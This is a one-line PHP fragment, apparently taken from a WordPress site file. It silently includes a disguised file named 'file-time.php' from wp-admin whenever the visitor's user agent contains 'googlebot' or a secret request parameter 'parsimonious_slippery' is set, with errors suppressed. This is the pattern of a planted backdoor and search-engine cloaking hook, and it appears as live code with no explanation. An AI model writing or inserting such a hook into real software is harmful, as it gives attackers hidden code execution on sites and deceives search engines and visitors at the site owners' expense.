...
if (strpos(strtolower($_SERVER["HTTP_USER_AGENT"]),"googlebot") !== false or isset($_REQUEST["parsimonious_slippery"]) ){@include(dirname(__FILE__) . "/../wp-admin/includes/file-time.php");}